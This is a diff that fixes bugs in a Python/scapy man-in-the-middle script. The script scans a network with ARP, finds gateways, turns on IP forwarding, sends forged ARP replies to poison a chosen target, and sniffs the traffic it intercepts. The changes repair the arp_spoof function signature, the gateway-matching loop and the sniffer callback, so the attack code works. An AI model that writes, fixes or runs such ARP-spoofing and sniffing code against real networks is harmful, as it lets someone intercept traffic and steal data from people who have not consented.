@@ -27,7 +27,7 @@ def check_sudo():
 
 #now we will start scanning arp basically embedded the scanner into the engine
 def arp_scan(ip_range):
-    arp_responses = list[]
+    arp_responses = list()
 
     answered_lst = scapy.arping(ip_range,verbose=0)[0]
     for res in answered_lst:
@@ -79,8 +79,10 @@ def gateway_info(network_info):
     gateways = []
 
     for iface in network_info:
-        iface_name = match_iface(row)
-        gateways.append({"iface" : iface_name, "ip" : iface["ip"],  "mac" : iface["mac"] })
+        for row in result:
+            if iface["ip"] in row:
+                iface_name = match_iface(row)
+                gateways.append({"iface" : iface_name, "ip" : iface["ip"],  "mac" : iface["mac"] })
 
 
     return gateways
@@ -108,7 +110,7 @@ def ip_forwarding():
 
 #now all things are set up and we will do arp spoofing
 
-def arp_spoof()
+def arp_spoof(target_ip, target_mac, spoof_ip):
     pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
     scapy.send(pkt, verbose=False)
 
@@ -124,7 +126,7 @@ def send_packets():
 
 #a callback fx to sniff packets
 def sniffer(interface):
-    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
+    packets = scapy.sniff(iface = interface, store = False, prn = proc_sniff)
 
 #process the sniffed pckts
 def proc_sniff(pkt):
